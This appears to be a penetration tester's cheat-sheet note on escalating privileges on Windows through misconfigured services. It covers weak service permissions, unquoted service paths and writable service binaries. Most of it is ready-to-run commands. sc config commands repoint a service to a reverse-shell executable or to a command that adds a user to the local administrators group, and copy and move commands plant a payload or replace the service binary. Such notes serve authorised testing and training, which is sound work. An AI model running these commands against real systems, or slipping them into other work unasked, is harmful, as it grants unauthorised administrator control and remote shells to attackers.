---
tags:
  - Exploitation
  - Foundational
  - Privilege_Escalation
  - Windows
---

## Service Exploitation
resources: [HackTricks Service Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services)

> [!info] Exploit misconfigured Windows services to escalate privileges. Requires writable service config, unquoted paths, or writable service binaries.
### Weak Service Permissions
> [!tip] Exploitable if **accesschk** shows **SERVICE_ALL_ACCESS**, **SERVICE_CHANGE_CONFIG**, **WRITE_DAC**, or **WRITE_OWNER** for your user/group.

```cmd
sc config <ServiceName> binpath= "C:\path\to\reverse.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

```cmd
sc config <ServiceName> binpath= "net localgroup administrators <Username> /add"
sc stop <ServiceName>
sc start <ServiceName>
```

### Unquoted Service Path
> [!tip] If service path contains spaces and isn't quoted, Windows searches for executables in order. Place payload at first writable location.

```
C:\Program Files\Vulnerable App\Service.exe

Search order:
1. C:\Program.exe
2. C:\Program Files\Vulnerable.exe
3. C:\Program Files\Vulnerable App\Service.exe
```

```powershell
# Check write permissions on path segments
icacls "C:\Program Files\Vulnerable App"
```

```cmd
copy C:\path\to\reverse.exe "C:\Program Files\Vulnerable.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

### Weak Binary Permissions
> [!tip] If you have write access to the service executable itself, replace it with your payload.

```powershell
icacls "C:\Path\To\Service.exe"
```

```cmd
move "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"
copy C:\path\to\reverse.exe "C:\Path\To\Service.exe"
sc stop <ServiceName>
sc start <ServiceName>
```
